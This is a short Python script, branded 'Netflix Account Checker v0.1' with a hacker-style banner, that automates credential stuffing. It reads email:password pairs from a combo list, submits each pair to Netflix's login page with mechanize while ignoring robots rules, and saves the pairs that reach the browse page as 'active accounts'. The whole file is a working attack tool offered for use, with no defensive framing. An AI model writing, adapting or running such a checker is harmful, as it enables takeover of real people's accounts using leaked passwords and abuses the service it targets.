def print_banner(rmxThePHREAK):
    banner = """
██████╗░░█████╗░███╗░░░███╗███╗░░░███╗░█████╗░██████╗░
██╔══██╗██╔══██╗████╗░████║████╗░████║██╔══██╗██╔══██╗
██║░░██║██║░░██║██╔████╔██║██╔████╔██║███████║██████╔╝
██║░░██║██║░░██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██╔══██╗
██████╔╝╚█████╔╝██║░╚═╝░██║██║░╚═╝░██║██║░░██║██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝
    """
    print(banner)
    print(rmxThePHREAK)

import mechanize
import time

print_banner('[+]---Netflix Account Checker v0.1---[+]')
time.sleep(2)
contex=0
contno=0

accPass=[]
outfile = open('Active.txt', 'w')


br = mechanize.Browser()
# print('br : ', br)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]
try:
    with open("combo.txt", "r") as filestream:
        for line in filestream:
            br.open('https://www.netflix.com/en/login')
            currentline = line.split(':')
            print('currentline : ', currentline)
            # print('br before : ', br)
            br.select_form(nr=0)
            # print('br after : ', br)
            br.form['userLoginId'] = currentline[0]
            br.form['password'] = currentline[1]
            print ('logging in to.. email: '+br.form['userLoginId'])
            response = br.submit()
            print('response : ', response.geturl())
            if response.geturl()=='https://www.netflix.com/browse':
                print ('Account Works')
                contex = contex + 1
                br.open('https://www.netflix.com/SignOut?lnkctr=mL')
                accPass.append(currentline[0]+':'+currentline[1])
                time.sleep(2)
            else:
                print ('Account does not work')
                contno = contno + 1
                time.sleep(2)
    print ('Writing active accounts to txt..')
    for all in accPass:
        print ('all : ' + all)
        outfile.write(str(all)+'\n')
except Exception as e:
    print(f"Something bad happened: {e}. Saving progress...")
    for all in accPass:
        outfile.write(str(all)+'\n')
    
print ('active accounts: ' + str(contex))
print ('inactive accounts: ' + str(contno))

